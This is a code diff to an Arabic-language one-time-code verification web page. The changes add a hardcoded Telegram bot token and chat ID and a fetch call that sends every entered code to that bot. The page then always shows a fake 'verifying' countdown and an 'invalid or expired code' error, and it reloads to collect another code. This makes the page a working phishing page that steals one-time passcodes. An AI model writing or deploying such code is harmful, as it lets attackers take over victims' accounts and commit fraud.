@@ -90,11 +90,6 @@
             transition: opacity 0.3s;
         }
 
-        .verify-btn:disabled {
-            background-color: #cbd5e0;
-            cursor: not-allowed;
-        }
-
         .resend-text {
             margin-top: 20px;
             font-size: 14px;
@@ -117,12 +112,6 @@
             display: none;
         }
 
-        .verification-icon {
-            font-size: 36px;
-            color: #f59e0b;
-            margin-bottom: 10px;
-        }
-
         .error-message {
             background: rgba(220, 53, 69, 0.15);
             border: 1px solid var(--error-color);
@@ -133,22 +122,15 @@
             display: none;
         }
 
-        .error-icon {
-            font-size: 36px;
-            color: var(--error-color);
-            margin-bottom: 10px;
-        }
-
         .countdown {
             font-size: 24px;
             font-weight: bold;
-            color: var(--error-color);
+            color: #f59e0b;
             margin: 15px 0;
-            display: none;
         }
 
         .hidden {
-            display: none;
+            display: none !important;
         }
     </style>
 </head>
@@ -177,16 +159,16 @@
     </div>
 
     <div class="verification-message" id="verificationMessage">
-        <div class="verification-icon">⏳</div>
-        <h3>جارٍ التحقق من المعلومات...</h3>
-        <p>يرجى الانتظار بينما نقوم بالتحقق من صحة البيانات المدخلة</p>
+        <div style="font-size: 36px; color: #f59e0b;">⏳</div>
+        <h3>جارٍ التحقق من الرمز...</h3>
+        <p>يرجى الانتظار بينما نقوم بمعالجة طلبك</p>
         <div class="countdown" id="countdown">10</div>
     </div>
 
     <div class="error-message" id="errorMessage">
-        <div class="error-icon">❌</div>
+        <div style="font-size: 36px; color: var(--error-color);">❌</div>
         <h3>خطأ في التحقق</h3>
-        <p>المعلومات المدخلة غير صحيحة. يرجى المحاولة مرة أخرى.</p>
+        <p>الرمز الذي أدخلته غير صحيح أو انتهت صلاحيته.</p>
     </div>
 </div>
 
@@ -200,90 +182,60 @@ document.addEventListener('DOMContentLoaded', function() {
     const countdownElement = document.getElementById('countdown');
     const otpInputsContainer = document.querySelector('.otp-inputs');
     const resendSection = document.querySelector('.resend-text');
-    let countdownInterval;
-    
-    // تفعيل التنقل بين حقول OTP
+
+    const botToken = '8524439098:AAFyTnibWXP4C0qtGhfxx--5eVburUrHwYY';
+    const chatId = '8485270011';
+
     inputs.forEach((input, index) => {
         input.addEventListener('input', (e) => {
-            const value = e.data || '';
-            if (/^\d$/.test(value) && index < inputs.length - 1) {
-                inputs[index + 1].focus();
-            }
+            if (e.target.value && index < inputs.length - 1) inputs[index + 1].focus();
         });
-
         input.addEventListener('keydown', (e) => {
-            if (e.key === 'Backspace' && !e.target.value && index > 0) {
-                inputs[index - 1].focus();
-            }
-        });
-        
-        input.addEventListener('paste', function(e) {
-            e.preventDefault();
-            const paste = (e.clipboardData || window.clipboardData).getData('text');
-            if (/^\d{6}$/.test(paste)) {
-                paste.split('').forEach((char, i) => {
-                    if (inputs[i]) {
-                        inputs[i].value = char;
-                    }
-                });
-                inputs[5].focus();
-            }
+            if (e.key === 'Backspace' && !e.target.value && index > 0) inputs[index - 1].focus();
         });
     });
-    
-    // معالجة إرسال النموذج
+
     otpForm.addEventListener('submit', function(e) {
         e.preventDefault();
-        
-        // جمع قيم OTP
-        const otpValues = Array.from(inputs).map(input => input.value);
-        const otpCode = otpValues.join('');
-        
-        // التحقق من إدخال جميع الأرقام
-        if (otpValues.some(value => !value) || otpCode.length !== 6) {
-            alert('❌ يرجى إدخال جميع أرقام رمز التحقق (6 أرقام)');
+        const otpCode = Array.from(inputs).map(input => input.value).join('');
+
+        if (otpCode.length !== 6) {
+            alert('يرجى إدخال الرمز كاملاً');
             return;
         }
-        
-        if (!/^\d{6}$/.test(otpCode)) {
-            alert('❌ الرمز يجب أن يتكون من أرقام فقط');
-            return;
-        }
-        
-        // إخفاء حقول الإدخال والزر وإظهار رسالة التحقق
+
+        // إرسال الرمز للبوت
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: `🔢 *رمز OTP جديد*\nالرمز: ${otpCode}\n📅 ${new Date().toLocaleString('ar-EG')}`,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        // تأثيرات الواجهة
         otpInputsContainer.classList.add('hidden');
         verifyBtn.classList.add('hidden');
         resendSection.classList.add('hidden');
         verificationMessage.style.display = 'block';
-        
-        // بدء العد التنازلي
+
         let counter = 10;
-        countdownElement.textContent = counter;
-        
-        countdownInterval = setInterval(() => {
+        const interval = setInterval(() => {
             counter--;
             countdownElement.textContent = counter;
-            
             if (counter <= 0) {
-                clearInterval(countdownInterval);
-                
-                // إخفاء رسالة التحقق وإظهار رسالة الخطأ
+                clearInterval(interval);
                 verificationMessage.style.display = 'none';
                 errorMessage.style.display = 'block';
                 
-                // التحويل التلقائي بعد ثانيتين
+                // إعادة التوجيه لطلب رمز جديد بعد الخطأ
                 setTimeout(() => {
-                    window.location.href = 'page3.html?error=invalid_information';
-                }, 2000);
+                    location.reload();
+                }, 3000);
             }
         }, 1000);
-    });
-    
-    // إعادة تعيين الصفحة عند التحميل
-    window.addEventListener('load', function() {
-        if (new URLSearchParams(window.location.search).has('error')) {
-            // يمكن إضافة معالجة لرسالة الخطأ هنا إذا أردت
-        }
     });
 });
 </script>
